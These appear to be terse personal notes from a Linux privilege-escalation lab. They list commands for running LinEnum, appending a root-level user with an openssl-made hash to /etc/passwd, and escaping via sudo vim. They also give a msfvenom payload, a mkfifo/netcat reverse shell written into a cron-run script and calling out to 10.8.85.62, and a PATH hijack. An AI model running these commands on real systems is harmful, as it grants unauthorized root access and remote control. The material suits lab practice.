Downloads file `LinEnum.sh` :  https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh

connect to the machine.
name : polobox -> 8 user[x] -> cat etc/shells ->4 shell
login to user4 -> autoscript.sh -> etc/passwd

make a listen port : python3 -m http.server 8000 -> Download file LinEnum.sh to the target machine -> run
connect to user7 -> make a password hash : `openssl passwd -1 -salt [salt] [password]` -> `$1$new$p7ptkEKU1HnaHpRtzNizS1` ( salt : new , password : 123)

add new user with password hash to /etc/passwd : `new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash` -> su new ( change to `new` user)
remember : `sudo -l ` to check command use as root user.

edit vim -> to be come root .
connect to user4 -> download file LinEnum.sh -> run
make a payload in host machine : `msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R`

add payload to file autoscript.sh : `echo 'mkfifo /tmp/yajqabh; nc 10.8.85.62 8888 0</tmp/yajqabh | /bin/sh&1; rm /tmp/yajqabh' > autoscript.sh`
wait 5' for file can run.


echo "/bin/bash" > ls
chmod +x ls
export PATH=/tmp:$PATH
cd ~ -> ./script